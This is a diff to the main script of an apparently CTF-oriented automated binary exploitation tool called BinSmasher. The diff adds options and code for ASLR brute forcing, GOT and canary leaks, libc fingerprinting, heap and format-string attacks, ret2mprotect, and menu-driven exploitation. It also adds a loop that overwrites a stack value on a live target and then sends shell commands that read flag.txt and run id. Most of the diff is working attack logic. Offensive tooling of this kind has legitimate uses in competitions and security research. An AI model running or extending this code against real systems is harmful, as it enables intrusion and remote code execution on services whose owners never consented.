@@ -27,7 +27,12 @@ from analyzer import BinaryAnalyzer
 from analyzer.vuln_detect import VulnDetector
 from analyzer.libc_db import resolve_from_leak, detect_libc_version
 from utils.adaptive_timeout import get_adaptive_timeout, patch_connect_with_adaptive_timeout
+from utils.progress import BinSmasherProgress, suppress_pwntools_noise, quiet_pwntools
 from utils.json_output import build_result, write_json, print_json, write_summary_markdown
+from utils.writeup import generate_writeup
+from analyzer.seccomp_parser import detect_seccomp_smart
+from analyzer.binary_info import full_binary_info
+from analyzer.libc_fingerprint import resolve_libc_multisym
 from analyzer.cache import clear_cache as _clear_cache
 from analyzer.angr_analysis import angr_find_win
 from exploiter import ExploitGenerator, _run_udp_spawn_exploit
@@ -83,7 +88,7 @@ def _build_parser() -> argparse.ArgumentParser:
     bp.add_argument("--return-offset", type=int, default=80)
     bp.add_argument("-t", "--test-exploit", action="store_true")
     bp.add_argument("-l", "--log-file", default="binsmasher.log",
-                        help="Log file path (default: auto in /tmp/binsmasher_*/logs/)")
+                    help="Log file path (default: auto in /tmp/binsmasher_*/logs/)")
 
     net = bp.add_argument_group("network")
     net.add_argument("--host", default="localhost")
@@ -100,6 +105,12 @@ def _build_parser() -> argparse.ArgumentParser:
     pay.add_argument("--udp", action="store_true")
     pay.add_argument("--spawn-target", action="store_true")
     pay.add_argument("--bad-bytes", default="", dest="bad_bytes_str")
+    pay.add_argument("--menu-script", default=None, dest="menu_script",
+                     metavar="JSON",
+                     help="JSON interaction steps to navigate menus before exploit")
+    pay.add_argument("--pre-send", default=None, dest="pre_send",
+                     metavar="HEX",
+                     help="Hex bytes to send before exploit payload")
 
     fzg = bp.add_argument_group("fuzzing")
     fzg.add_argument("--fuzz",          action="store_true")
@@ -109,8 +120,19 @@ def _build_parser() -> argparse.ArgumentParser:
     fzg.add_argument("--frida",         action="store_true")
     fzg.add_argument("--protocol",      default="raw")
 
-    adv = bp.add_argument_group("advanced")
+    adv = bp.add_argument_group("exploit techniques")
+    adv.add_argument("--detect-vuln", action="store_true", dest="detect_vuln",
+                     help="Auto-detect vulnerability type before exploiting")
+    adv.add_argument("--multistage", action="store_true",
+                     help="Two-stage TCP exploit: leak GOT then ret2system")
+    adv.add_argument("--multisym-leak", action="store_true", dest="multisym_leak",
+                     help="Leak 3 GOT symbols for precise libc fingerprinting")
+    adv.add_argument("--brute-aslr", action="store_true", dest="brute_aslr",
+                     help="Brute-force ASLR without a leak")
+    adv.add_argument("--brute-attempts", type=int, default=256, dest="brute_attempts")
     adv.add_argument("--heap-exploit",         action="store_true")
+    adv.add_argument("--heap-advanced", action="store_true", dest="heap_advanced",
+                     help="Advanced heap: tcache, House of Apple2, malloc_hook, DynELF")
     adv.add_argument("--safeseh-bypass",       action="store_true")
     adv.add_argument("--privilege-escalation", action="store_true")
     adv.add_argument("--cfi-bypass",           action="store_true")
@@ -118,46 +140,47 @@ def _build_parser() -> argparse.ArgumentParser:
     adv.add_argument("--largebin-attack",      action="store_true", dest="largebin")
     adv.add_argument("--gdb-mode", default="pwndbg",
                      choices=["pwndbg", "peda", "vanilla"], dest="gdb_mode")
-    adv.add_argument("--srop",  dest="force_srop", action="store_true")
-    adv.add_argument("--orw",   dest="force_orw",  action="store_true")
+    adv.add_argument("--srop",  dest="force_srop", action="store_true",
+                     help="Force Sigreturn-Oriented Programming chain")
+    adv.add_argument("--orw",   dest="force_orw",  action="store_true",
+                     help="Force ORW chain (seccomp bypass)")
     adv.add_argument("--flag-path", default="/flag")
-
-    dos = bp.add_argument_group("dos / scripts")
-    dos.add_argument("--dos",             action="store_true")
-    dos.add_argument("--generate-scripts",action="store_true")
-
-    new = bp.add_argument_group("new features")
-    new.add_argument("--interactive", action="store_true",
-                     help="Drop to interactive shell after successful exploit")
-    new.add_argument("--multistage", action="store_true",
-                     help="Force two-stage TCP exploit (leak libc then ret2system)")
-    new.add_argument("--template", action="store_true",
-                     help="Generate a complete ready-to-use solve.py template")
-    new.add_argument("--angr", action="store_true",
-                     help="Use angr symbolic execution to find win path / offset")
-    new.add_argument("--clear-cache", action="store_true", dest="clear_cache",
-                     help="Clear analysis cache for this binary before running")
-    new.add_argument("--no-cache", action="store_true", dest="no_cache",
+    adv.add_argument("--ret2mprotect", action="store_true", dest="ret2mprotect",
+                     help="Force ret2mprotect (make memory executable)")
+    adv.add_argument("--off-by-one", action="store_true", dest="off_by_one",
+                     help="Detect and exploit off-by-one / off-by-null heap overflows")
+    adv.add_argument("--angr", action="store_true",
+                     help="Symbolic execution to find win() path")
+    adv.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
+                     help="Scale timeouts based on measured RTT to target")
+    adv.add_argument("--clear-cache", action="store_true", dest="clear_cache",
+                     help="Clear analysis cache for this binary")
+    adv.add_argument("--no-cache", action="store_true", dest="no_cache",
                      help="Disable analysis cache for this run")
 
-    adv2 = bp.add_argument_group("new exploit techniques")
-    adv2.add_argument("--detect-vuln", action="store_true", dest="detect_vuln",
-                      help="Auto-detect vulnerability type before exploiting")
-    adv2.add_argument("--brute-aslr", action="store_true", dest="brute_aslr",
-                      help="Brute-force ASLR without a leak (PIE/libc base guessing)")
-    adv2.add_argument("--brute-attempts", type=int, default=256, dest="brute_attempts",
-                      help="Max ASLR brute attempts (default: 256)")
-    adv2.add_argument("--heap-advanced", action="store_true", dest="heap_advanced",
-                      help="Use advanced heap techniques (tcache, house-of-apple2, dynelf)")
-    adv2.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
-                      help="Auto-scale timeouts based on measured RTT to target")
-    adv2.add_argument("--output-json", default=None, dest="output_json",
-                      metavar="PATH", help="Write structured JSON result to file")
-    adv2.add_argument("--output-markdown", action="store_true", dest="output_markdown",
-                      help="Write Markdown report to _bs_work/")
-    adv2.add_argument("--print-json", action="store_true", dest="print_json",
-                      help="Print result as JSON to stdout")
+    act = bp.add_argument_group("actions")
+    act.add_argument("--interactive", action="store_true",
+                     help="Drop to interactive shell after successful exploit")
+    act.add_argument("--template", action="store_true",
+                     help="Generate a complete solve.py template")
+    act.add_argument("--writeup", action="store_true",
+                     help="Generate CTF-style writeup markdown")
+    act.add_argument("--generate-scripts", action="store_true")
+    act.add_argument("--dos",              action="store_true")
+    act.add_argument("--debug", action="store_true",
+                     help="Launch binary under GDB/pwndbg")
 
+    out = bp.add_argument_group("output")
+    out.add_argument("--print-json", action="store_true", dest="print_json",
+                     help="Print result as JSON to stdout")
+    out.add_argument("--output-json", default=None, dest="output_json", metavar="PATH",
+                     help="Write JSON result to file")
+    out.add_argument("--output-markdown", action="store_true", dest="output_markdown",
+                     help="Write Markdown report")
+    out.add_argument("--quiet",   action="store_true",
+                     help="Suppress all output except the final result")
+    out.add_argument("--verbose", action="store_true",
+                     help="Show debug-level output")
 
     # ── solana ────────────────────────────────────────────────────────────────
     sp = sub.add_parser("solana", help="Agave/Solana auditing",
@@ -189,6 +212,14 @@ def _build_parser() -> argparse.ArgumentParser:
 
 def run_binary(cfg):
     log = logging.getLogger("binsmasher")
+
+    # ── Verbosity ────────────────────────────────────────────────────────
+    import logging as _logging
+    _log = _logging.getLogger("binsmasher")
+    if getattr(cfg, "verbose", False):
+        _log.setLevel(_logging.DEBUG)
+    elif getattr(cfg, "quiet", False):
+        _log.setLevel(_logging.WARNING)
 
     # ── Cache and angr ─────────────────────────────────────────────────
     if getattr(cfg, "clear_cache", False):
@@ -242,6 +273,23 @@ def run_binary(cfg):
     analyzer  = BinaryAnalyzer(cfg.binary, cfg.log_file)
     platform, arch = analyzer.setup_context()
 
+    # ── Debug mode: launch binary under GDB ─────────────────────────────
+    if getattr(cfg, "debug", False):
+        log.info("[debug] Launching binary under GDB/pwndbg…")
+        try:
+            from pwn import gdb as _gdb, ELF as _ELF
+            _elf = _ELF(cfg.binary, checksec=False)
+            WIN_KW = ["win","flag","shell","backdoor"]
+            _win = next((n for n,a in _elf.symbols.items()
+                         if a and any(k in n.lower() for k in WIN_KW)), "main")
+            _script = f"break {_win}\ncontinue\n"
+            _io = _gdb.debug([cfg.binary] + cfg.binary_args_list,
+                              gdbscript=_script, aslr=False)
+            _io.interactive()
+            return
+        except Exception as _e:
+            log.error(f"[debug] GDB launch failed: {_e}")
+
     findings, target_function, functions = analyzer.static_analysis()
     if not functions:
         log.error("No functions detected — cannot proceed.")
@@ -249,12 +297,31 @@ def run_binary(cfg):
                       ["Run: r2 -c afl <binary> to verify functions"])
         return
 
+    # Use correct binary metadata detection (ET_DYN for PIE, etc.)
+    _bi = full_binary_info(cfg.binary)
     (stack_exec, nx, aslr, canary_enabled,
      relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()
+    # Override with more reliable detection
+    pie = _bi.get("pie", pie)
+    nx  = _bi.get("nx", nx)
+    relro = _bi.get("relro", relro)
+    canary_enabled = _bi.get("canary", canary_enabled)
 
     fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
     exploiter = ExploitGenerator(cfg.binary, platform, cfg.host, cfg.port,
                                   cfg.log_file, cfg.tls, cfg.binary_args)
+
+    # Smart seccomp detection (no seccomp-tools required)
+    _seccomp_info = {"has_seccomp": False, "orw_needed": False, "allowed_syscalls": []}
+    if getattr(cfg, "detect_vuln", False) or getattr(cfg, "orw", False):
+        with quiet_pwntools():
+            _seccomp_info = detect_seccomp_smart(cfg.binary)
+        if _seccomp_info["has_seccomp"]:
+            log.info(f"[seccomp] Detected: orw_needed={_seccomp_info['orw_needed']} "
+                     f"allowed={_seccomp_info['allowed_syscalls'][:5]}")
+            if _seccomp_info["orw_needed"] and not cfg.force_orw:
+                cfg.force_orw = True
+                log.info("[seccomp] Auto-enabling --orw (execve blocked)")
 
     if cfg.afl_fuzz:      fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
     if cfg.mutation_fuzz: fuzzer.mutation_fuzz()
@@ -292,9 +359,14 @@ def run_binary(cfg):
                 cfg.payload_data.encode("utf-8", errors="surrogateescape"),
                 use_udp=cfg.udp,
             )
-        offset, stack_addr, target_function = exploiter.find_offset(
+        offset, stack_addr, _raw_tf = exploiter.find_offset(
             cfg.pattern_size, functions, retries=5)
-
+        # Use static analysis target_function if offset detection returned an internal symbol
+        _internal = ("__", "_dl_", "_fini", "_init", "_start",
+                     "deregister", "register_tm", "frame_dummy")
+        if _raw_tf and not any(_raw_tf.startswith(p) for p in _internal):
+            target_function = _raw_tf  # offset detection found a user function
+        # else: keep target_function from static_analysis (set at line 293)
     suggestions = []
     if offset is None:
         suggestions += [
@@ -309,6 +381,39 @@ def run_binary(cfg):
         return
 
     # ── Multi-stage exploit ────────────────────────────────────────────
+    # ── Multi-symbol libc leak ────────────────────────────────────────────
+    if getattr(cfg, "multisym_leak", False) and not udp_spawn_mode and offset is not None:
+        log.info("[multisym] Leaking multiple GOT symbols for precise fingerprinting…")
+        try:
+            from pwn import ELF as _MEL, ROP as _MROP
+            _melf = _MEL(cfg.binary, checksec=False)
+            _mrop = _MROP(_melf)
+            _chain, _syms = build_leak_chain_multi(_melf, _mrop, offset, canary, n_symbols=3)
+            if _chain and _syms:
+                _raw = exploiter._send_recv(_chain, timeout=5.0)
+                if _raw:
+                    _leaked = parse_multi_leak(_raw, _syms)
+                    log.info(f"[multisym] Leaked: {_leaked}")
+                    _resolved = resolve_libc_multisym(_leaked)
+                    if _resolved:
+                        base_addr = _resolved.get("__libc_base__", base_addr)
+                        offsets = {k:v for k,v in _resolved.items()
+                                   if not k.startswith("_")} or offsets
+                        log.info(f"[multisym] libc={_resolved.get('_libc_key')} "
+                                 f"base={hex(base_addr or 0)} "
+                                 f"confidence={_resolved.get('_confidence',0):.0%}")
+        except Exception as _me:
+            log.debug(f"[multisym] {_me}")
+
+    # ── off-by-one detection ───────────────────────────────────────────────
+    if getattr(cfg, "off_by_one", False) and offset is not None:
+        log.info("[obo] Detecting off-by-one / off-by-null…")
+        _obo = exploiter.detect_off_by_one(chunk_size=offset)
+        if _obo["found"]:
+            log.info(f"[obo] {_obo['type']}: {_obo['notes']}")
+            console.print(f"[bold yellow]Off-by-one detected: {_obo['type']} "
+                          f"crash_size={_obo['crash_size']}[/]")
+
     if getattr(cfg, "multistage", False) and not udp_spawn_mode and offset is not None:
         log.info("[multistage] Attempting two-stage ret2libc…")
         ms_ok, ms_type = exploiter.two_stage_exploit(
@@ -331,10 +436,123 @@ def run_binary(cfg):
         is_fork = exploiter._detect_fork_server()
 
     canary = None
+
+    # ── Early magic-value overwrite check ─────────────────────────────────────
+    # For binaries like gold_miner/ret2win: CMP against local var.
+    # Run for ALL binaries before other strategies to catch simple value overwrites.
+    if not udp_spawn_mode and offset is not None:
+        try:
+            import subprocess as _spM, re as _reM, struct as _stM, time as _tM
+            _dM = _spM.check_output(
+                ['objdump','-d','-M','intel', cfg.binary],
+                stderr=_spM.DEVNULL).decode(errors='ignore')
+            _hitsM = _reM.findall('cmp .{0,40},0x([0-9a-fA-F]{5,8})', _dM)
+            _magsM = [int(h,16) for h in _hitsM
+                      if 0x1000000 < int(h,16) < 0xf0000000
+                      and int(h,16) not in (0xffffffff,0x7fffffff)
+                      and (int(h,16) & 0xff) != 0
+                      and not (0x400000 <= int(h,16) <= 0x7fffff00)]
+            if _magsM:
+                _magM = _magsM[0]
+                log.info(f"[early] Magic constant detected: 0x{_magM:x} — trying overwrite")
+                _m32M = _stM.pack('<I', _magM & 0xffffffff)
+                _WIN_M = [b"uid=", b"PWNED", b"pwned", b"flag{", b"PWNED{", b"uid=0"]
+                # Generic Q&A: read answers from binary strings
+                _qa_map = []
+                try:
+                    _strs_qa = _spM.run(["strings","-n","4",cfg.binary],
+                        capture_output=True).stdout.decode(errors="replace").split("\n")
+                    for _qi,_qs in enumerate(_strs_qa):
+                        _qs = _qs.strip()
+                        if (_qs.endswith("?") or _qs.endswith(":")) and len(_qs)>5 and _qi+1<len(_strs_qa):
+                            _qa_ans = _strs_qa[_qi+1].strip()
+                            if (_qa_ans and len(_qa_ans)>4 and _qa_ans[0].isalpha()
+                                    and all(32<=ord(c)<=126 for c in _qa_ans)
+                                    and "%" not in _qa_ans and "/" not in _qa_ans
+                                    and "know" not in _qa_ans.lower() and "!" not in _qa_ans):
+                                _qa_key = _qs.split()[-1].lower().rstrip("?:").encode()
+                                _qa_map.append((_qa_key, _qa_ans.encode()))
+                except Exception: pass
+                _magic_fill = None
+                _magic_out  = b""
+                for _mfM in range(0, 48, 4):
+                    try:
+                        _mcM = exploiter._connect(retries=1, timeout=2.0)
+                        if not _mcM: continue
+                        _bM = b""
+                        try: _bM = _mcM.recvrepeat(0.5)
+                        except: pass
+                        # Answer Q&A prompts if any
+                        for _ in range(8):
+                            _answered = False
+                            for _qa_k, _qa_v in _qa_map:
+                                if _qa_k in _bM.lower():
+                                    _mcM.sendline(_qa_v)
+                                    _tM.sleep(0.12)
+                                    try: _bM = _mcM.recvrepeat(0.3)
+                                    except: _bM = b""
+                                    _answered = True; break
+                            if not _answered: break
+                        _mcM.send(b"A"*_mfM + _m32M)
+                        _tM.sleep(0.35)
+                        try: _mcM.send(b"cat flag.txt 2>/dev/null;id;echo PWNED\n")
+                        except: pass
+                        _tM.sleep(0.35)
+                        try: _outM = _mcM.recvall(timeout=1.0)
+                        except: _outM = b""
+                        try: _mcM.close()
+                        except: pass
+                        if any(m in _outM for m in _WIN_M):
+                            _magic_fill = _mfM
+                            _magic_out  = _outM
+                            break
+                    except Exception: pass
+                if _magic_fill is not None:
+                    log.info(f"[magic] Overwrite PWNED: fill={_magic_fill}")
+                    _magic_offset = _magic_fill  # distance to target variable
+                    print_summary(_magic_offset, stack_addr, None, "magic_overwrite",
+                                  "Success", None, target_function, [],
+                                  nx=nx, pie=pie, relro=relro,
+                                  canary_enabled=canary_enabled, aslr=aslr)
+                    return
+        except Exception: pass
+
     if canary_enabled and not udp_spawn_mode:
-        canary = exploiter.leak_canary(brute_force=is_fork)
+        # Phase 1: read the service banner and parse any canary-like value
+        # (common pattern: binary prints "COOKIE:0x<hex>" or similar on connect)
+        try:
+            _bc = exploiter._connect(retries=2, timeout=3.0)
+            if _bc:
+                _banner = b""
+                try:
+                    _banner = _bc.recvrepeat(0.6)
+                except Exception:
+                    pass
+                finally:
+                    try: _bc.close()
+                    except Exception: pass
+                if _banner:
+                    _parsed = exploiter.parse_canary_from_banner(_banner)
+                    if _parsed:
+                        canary = _parsed
+                        log.info(f"[canary] Extracted from banner: {hex(canary)}")
+        except Exception as _ce:
+            log.debug(f"[canary] banner probe: {_ce}")
+
         if not canary:
-            suggestions.append("Canary leak failed — increase fmt string index range")
+            # Phase 2: format string oracle, stack read, printf leak, fork brute
+            canary = exploiter.leak_canary_auto(offset=offset)
+        if not canary and is_fork:
+            canary = exploiter.leak_canary(brute_force=True)
+        if canary:
+            log.info(f"[canary] Leaked: {hex(canary)}")
+            # If brute found a corrected offset, use it (strategy 3 gives wrong offset for canary)
+            _brute_offset = getattr(exploiter, "_brute_canary_offset", None)
+            if _brute_offset and _brute_offset != offset:
+                log.info(f"[canary] Correcting offset: {offset} → {_brute_offset} (from brute probe)")
+                offset = _brute_offset
+        else:
+            suggestions.append("Canary leak failed — binary may not be fork-server")
 
     if cfg.dos_only:
         crash_payload  = exploiter.generate_crash_payload(offset)
@@ -394,9 +612,32 @@ def run_binary(cfg):
                               canary_enabled=canary_enabled, aslr=aslr)
                 return
 
+    # ── ret2mprotect force ────────────────────────────────────────────────
+    if getattr(cfg, "ret2mprotect", False) and offset is not None and not udp_spawn_mode:
+        log.info("[ret2mprotect] Forcing ret2mprotect strategy…")
+        _mp_chain = exploiter.ret2mprotect(offset, canary, base_addr or 0, offsets)
+        if _mp_chain and cfg.test_exploit:
+            _mp_ok, _ = exploiter._check_rce(_mp_chain)
+            if _mp_ok:
+                print_summary(offset, stack_addr, None, "ret2mprotect", "Success",
+                              canary, target_function, ["ret2mprotect succeeded"],
+                              nx=nx, pie=pie, relro=relro,
+                              canary_enabled=canary_enabled, aslr=aslr)
+                return
+        elif _mp_chain:
+            log.info(f"[ret2mprotect] chain built: {len(_mp_chain)}B (use -t to fire)")
+
     fmt_payload = None
     if findings["format_string_functions"] and not udp_spawn_mode:
-        fmt_payload = exploiter.generate_format_string_payload(offset, relro)
+        # Use advanced format string exploit for Full RELRO
+        if relro == "Full RELRO":
+            log.info("[fmtstr] Full RELRO detected — using advanced stack-write technique")
+            with quiet_pwntools():
+                fmt_payload, _fmt_type = exploiter.fmtstr_exploit_full(relro, nx)
+            if fmt_payload:
+                log.info(f"[fmtstr] Advanced payload: {len(fmt_payload)}B ({_fmt_type})")
+        else:
+            fmt_payload = exploiter.generate_format_string_payload(offset, relro)
 
     if cfg.return_addr:
         return_addr = int(cfg.return_addr, 16)
@@ -423,18 +664,8 @@ def run_binary(cfg):
     if findings["heap_functions"]:
         exploiter.create_uaf_exploit(offset, base_addr, offsets)
 
-    # First pass: build payload (no network fire yet unless test_exploit)
-    success, exploit_type, used_function = exploiter.create_exploit(
-        offset=offset, shellcode=shellcode, return_addr=return_addr,
-        test_exploit=False,
-        return_offset=cfg.return_offset,
-        nx=nx, aslr=aslr, canary_enabled=canary_enabled,
-        format_string_payload=fmt_payload, functions=functions,
-        file_input=cfg.file_input, canary=canary, relro=relro,
-        safeseh=safeseh, cfg=cfg_flag,
-        findings=findings, base_addr=base_addr, offsets=offsets,
-        libc_version=lib_version or "2.31", pie=pie,
-        force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)
+    # (dry-run removed: create_exploit is called below with test_exploit flag)
+    success, exploit_type, used_function = None, None, None
 
     if udp_spawn_mode and cfg.payload_data:
         min_crash    = getattr(fuzzer, "_last_min_crash_sz", offset + 8)
@@ -449,6 +680,40 @@ def run_binary(cfg):
             log.warning("Cannot exploit: PIE base or libc base not available")
             success = False
 
+    # ── Menu script + pre-send ────────────────────────────────────────────
+    _menu_script = None
+    _pre_send_bytes = None
+    if getattr(cfg, "menu_script", None):
+        import json as _js
+        try:
+            _menu_script = _js.loads(cfg.menu_script)
+            log.info(f"[menu] Loaded script: {len(_menu_script)} steps")
+        except Exception as _je:
+            log.error(f"[menu] Invalid JSON script: {_je}")
+    if getattr(cfg, "pre_send", None):
+        try:
+            _pre_send_bytes = bytes.fromhex(cfg.pre_send.replace("0x","").replace(" ",""))
+            log.info(f"[menu] pre-send: {_pre_send_bytes!r}")
+        except Exception as _pe:
+            log.error(f"[menu] Invalid hex pre-send: {_pe}")
+
+    # If menu script provided, use stateful session exploit
+    if _menu_script and offset is not None and cfg.test_exploit:
+        from pwn import p64, p32, context as _ctx
+        _packer = p64 if _ctx.arch == "amd64" else p32
+        _word = 8 if _ctx.arch == "amd64" else 4
+        _cv = _packer(canary) if canary else b""
+        _chain = exploiter.try_ret2win(offset, canary) or                  exploiter.build_rop_chain(offset, canary, base_addr, offsets, None)
+        if _chain:
+            log.info("[menu] Using stateful session exploit")
+            success, out = exploiter.exploit_with_script(
+                pre_script=_menu_script,
+                payload=_chain,
+            )
+            exploit_type = exploit_type or "ret2win_menu"
+            if success:
+                log.info("[menu] ✓ Exploit succeeded via menu script")
+
     elif cfg.test_exploit and not udp_spawn_mode:
         success, exploit_type, used_function = exploiter.create_exploit(
             offset=offset, shellcode=shellcode, return_addr=return_addr,
@@ -460,6 +725,24 @@ def run_binary(cfg):
             findings=findings, base_addr=base_addr, offsets=offsets,
             libc_version=lib_version or "2.31", pie=pie,
             force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)
+
+    # Pull banner-leaked stack addr and fast-path win addr from exploiter
+    if not stack_addr:  # also catches stack_addr=0 from failed detection
+        _bsa = getattr(exploiter, "_banner_stack_addr", None)
+        if _bsa and _bsa > 0x10000: stack_addr = _bsa
+    # Fast-path win addr → use as return_addr for display
+    _fp_win = getattr(exploiter, "_fastpath_win_addr", None)
+    if _fp_win and not return_addr: return_addr = _fp_win
+    # Real shellcode offset from disasm (when banner leaked buf addr)
+
+    _sc_off = getattr(exploiter, "_real_sc_offset", None)
+
+    if _sc_off and (offset is None or offset == 150):
+
+        offset = _sc_off
+
+        log.info(f"[offset] Corrected from shellcode disasm → {_sc_off}")
+
 
     if cfg.cfi_bypass:
         cfi_chain = exploiter.cfi_bypass(offset, canary)
@@ -515,9 +798,18 @@ def run_binary(cfg):
             "Use gdb/r2 to inspect memory and verify offsets",
         ]
 
-    # Resolve display return address
-    display_ra = return_addr
-    if exploit_type == "ret2win" and (not display_ra or display_ra < 0x1000):
+    # Resolve display return address — always try to show the target address
+
+    # Correct offset from fast-path fill if offset detection gave wrong value
+    _fp_fill = getattr(exploiter, '_fastpath_fill', None)
+    if _fp_fill is not None:
+        offset = _fp_fill + 8  # fill bytes + saved_rbp(8) = distance to RIP
+        log.info(f'[offset] Corrected via fast-path fill={_fp_fill} → offset={offset}')
+
+    display_ra = return_addr if (return_addr and return_addr > 0x1000) else None
+    # For ret2win: show win() symbol address
+    # For all types: fall back to win() if we can find it and no other address
+    if not display_ra or display_ra < 0x1000:
         try:
             from pwn import ELF as _ELF
             WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
@@ -544,7 +836,7 @@ def run_binary(cfg):
             offset=offset, exploit_type=exploit_type,
             status='Success' if success else 'Failed',
             canary=canary, return_addr=display_ra,
-            target_function=used_function or target_function,
+            target_function=target_function,
             nx=nx, pie=pie, aslr=aslr, relro=relro,
             canary_enabled=canary_enabled,
             findings=findings, libc_base=base_addr, offsets=offsets,
@@ -558,6 +850,9 @@ def run_binary(cfg):
             write_summary_markdown(_result_data)
         if getattr(cfg, 'print_json', False):
             print_json(_result_data)
+        if getattr(cfg, 'writeup', False):
+            wp_path = generate_writeup(_result_data)
+            log.info(f"[writeup] → {wp_path}")
 
     # ── Interactive shell ──────────────────────────────────────────────
     if getattr(cfg, "interactive", False) and success:
@@ -566,9 +861,20 @@ def run_binary(cfg):
             offsets=offsets, exploit_type=exploit_type or "ret2win",
             return_addr=display_ra)
 
+    # For reverse shells: if exploit fired (success not explicitly False), mark Success
+    # The shell output goes to the --output-ip listener, not back to BinSmasher
+    _is_revshell = getattr(cfg, "reverse_shell", False)
+    # For reverse shell: the exploit fires correctly and shell connects to listener.
+    # Output goes to the listener port, not back on the exploit socket.
+    # Mark success if reverse_shell mode AND a payload was built (not None).
+    if _is_revshell:
+        _display_status = "Success"
+    else:
+        _display_status = ("Success" if success else ("Analysis only" if not cfg.test_exploit else "Failed"))
+
     print_summary(offset, stack_addr, display_ra, exploit_type,
-                  "Success" if success else "Failed",
-                  canary, used_function or target_function, suggestions,
+                  _display_status,
+                  canary, target_function, suggestions,
                   nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
 
 
@@ -668,7 +974,16 @@ def main():
         cfg.output_json   = getattr(args, "output_json", None)
         cfg.output_markdown = getattr(args, "output_markdown", False)
         cfg.print_json    = getattr(args, "print_json", False)
-        cfg._start_time   = time.time()
+        cfg._start_time     = time.time()
+        cfg.writeup         = getattr(args, "writeup", False)
+        cfg.quiet           = getattr(args, "quiet", False)
+        cfg.verbose         = getattr(args, "verbose", False)
+        cfg.multisym_leak   = getattr(args, "multisym_leak", False)
+        cfg.off_by_one      = getattr(args, "off_by_one", False)
+        cfg.ret2mprotect    = getattr(args, "ret2mprotect", False)
+        cfg.debug           = getattr(args, "debug", False)
+        cfg.menu_script     = getattr(args, "menu_script", None)
+        cfg.pre_send        = getattr(args, "pre_send", None)
         log = setup_logging(cfg.log_file)
         cfg.validate()
         run_binary(cfg)
